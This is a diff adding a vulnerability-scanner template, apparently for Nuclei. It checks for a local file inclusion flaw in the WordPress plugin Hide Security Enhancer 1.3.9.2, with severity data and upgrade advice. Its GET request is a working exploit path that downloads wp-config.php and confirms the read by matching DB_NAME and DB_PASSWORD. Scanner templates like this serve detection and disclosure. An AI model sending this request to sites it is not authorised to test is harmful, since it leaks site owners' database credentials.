@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - DB_NAME
+            - DB_PASSWORD
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php'
+id: hide-security-enhancer-lfi
+info:
+    author: dhiyaneshDK
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+        cvss-score: 8.6
+        cwe-id: CWE-22
+    description: WordPress Hide Security Enhancer version 1.3.9.2 or less is susceptible to a local file inclusion vulnerability which could allow malicious visitors to download any file in the installation.
+    metadata:
+        max-request: 1
+    name: WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion
+    reference:
+        - https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/
+    remediation: Upgrade to version 1.4 or later.
+    severity: high
+    tags:
+        - wordpress
+        - wp-plugin
+        - wp
+        - WordPress
+        - Oce
